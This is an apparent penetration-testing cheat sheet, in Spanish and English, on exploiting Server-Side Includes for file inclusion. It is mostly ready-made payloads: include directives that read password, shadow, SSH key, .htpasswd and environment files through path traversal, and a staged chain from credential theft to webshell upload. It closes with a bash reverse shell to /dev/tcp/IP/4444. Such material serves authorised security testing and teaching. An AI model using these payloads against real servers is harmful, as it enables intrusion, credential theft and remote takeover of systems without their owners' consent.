---
aliases:
  - SSI include virtual
  - SSI file include
  - SSI LFI
tags:
  - type/technique
  - vuln/ssi
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Server-Side Includes (SSI) Injection]]'
---
# SSI - Inclusión de Archivos

***

## `#include virtual` (URL-Relative)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Include relative URL | `<!--#include virtual="/admin/config.php" -->` | Path relativo a webroot. |
| Include other .shtml | `<!--#include virtual="/another.shtml" -->` | Recursive SSI. |
| Include CGI script | `<!--#include virtual="/cgi-bin/test.cgi" -->` | Executes CGI + embeds output. |
| Include with query string | `<!--#include virtual="/page.cgi?param=value" -->` | CGI con args. |
| Include host-relative | `<!--#include virtual="//other.com/page" -->` | Cross-domain — depends. |
| Path traversal | `<!--#include virtual="../../../../etc/passwd" -->` | Bypass webroot. |
| Mixed traversal | `<!--#include virtual="/uploads/../../../etc/passwd" -->` | Same. |
| Include uploaded file | `<!--#include virtual="/uploads/shell.shtml" -->` | RCE chain via upload. |
| Include PHP | `<!--#include virtual="/uploads/shell.php" -->` | If PHP handler co-exists. |
| Include con encoding | `%2F` for `/` | Encoding bypass. |
| Triggers handlers | virtual respects URL handlers (PHP, CGI, etc) | Standard. |
| Respects ACLs | virtual go through web auth layer | Limitation. |
^ssi-include-virtual

___

## `#include file` (Filesystem-Relative)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Read file absolute path | `<!--#include file="/etc/passwd" -->` | Direct file read. |
| Read shadow (root only) | `<!--#include file="/etc/shadow" -->` | Permissions matter. |
| Read app config | `<!--#include file="/var/www/html/config.php" -->` | Source disclosure. |
| Read SSH keys | `<!--#include file="/home/user/.ssh/id_rsa" -->` | If readable. |
| Read environ | `<!--#include file="/proc/self/environ" -->` | Process env. |
| Path traversal | `<!--#include file="../../etc/passwd" -->` | Relative traversal. |
| Read Apache config | `<!--#include file="/etc/apache2/apache2.conf" -->` | Server config. |
| Read .htpasswd | `<!--#include file="/etc/apache2/.htpasswd" -->` | Auth credentials. |
| Read backup files | `<!--#include file="/var/www/html/index.php.bak" -->` | Source disclosure. |
| Raw content (no handler) | `file=` returns raw, no PHP/CGI execution | Standard. |
| Symlink follow restrictions | Apache may restrict symlinks | Per-config. |
| Tomcat / IIS variants | Different file syntax | Per-server. |
^ssi-include-file

### Diferencias `virtual` vs `file`

```
virtual=       URL-relative
               Triggers handlers (PHP, CGI executed)
               Respects auth/ACLs
               Cannot escape webroot easily

file=          Filesystem-relative
               Raw file content (no execution)
               No auth check
               Can escape webroot via traversal
               May not follow symlinks
```

___

## LFI Chain via SSI

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Stage 1: Source disclosure | `<!--#include file="/var/www/index.php" -->` | Read PHP source. |
| Stage 2: Identify creds | Read app config con DB password | Standard. |
| Stage 3: Access DB | Use creds | Lateral. |
| Stage 4: Upload webshell | If file upload + LFI exists | RCE chain. |
| Stage 5: Include uploaded shell | `<!--#include virtual="/uploads/shell.php" -->` | Trigger PHP. |
| LFI to RCE flow | Standard pattern adjacent | Standard. |
| Read backup files | `index.php.bak`, `config.bak` | Common patterns. |
| Read git internals | `/.git/config`, `/.git/HEAD` | Source disclosure. |
| Read /proc | `/proc/self/cmdline`, `/proc/self/environ` | Process info. |
| Combine con php://filter | If PHP wrapper available | Edge. |
| `+IncludesNOEXEC` fallback | Use `#include` instead of `#exec` | Standard. |
| Combine con file upload XSS | Stored payload via upload | Multi-vector. |
| Existence check via `#fsize` | Probe file existence sin reveal contents | Recon. |
| Combine con cookie / header | Inject SSI via reflected header | Stealth. |
| Combine con upload | Upload .shtml con malicious SSI | Stored exec. |
^ssi-include-lfi-chain

### Workflow LFI to RCE chain

```html
<!-- Stage 1: Read app source -->
<!--#include file="/var/www/html/admin.php" -->
<!-- Identifies: DB creds, internal endpoints, sensitive paths -->

<!-- Stage 2: Read SSH key if accessible -->
<!--#include file="/home/devuser/.ssh/id_rsa" -->

<!-- Stage 3: Upload webshell via file upload (different vector) -->
<!-- Upload shell.php via /upload endpoint -->

<!-- Stage 4: Trigger via include virtual (handler PHP) -->
<!--#include virtual="/uploads/shell.php?cmd=id" -->

<!-- Stage 5: Or chain a #exec si NOEXEC not set -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'" -->
```

***
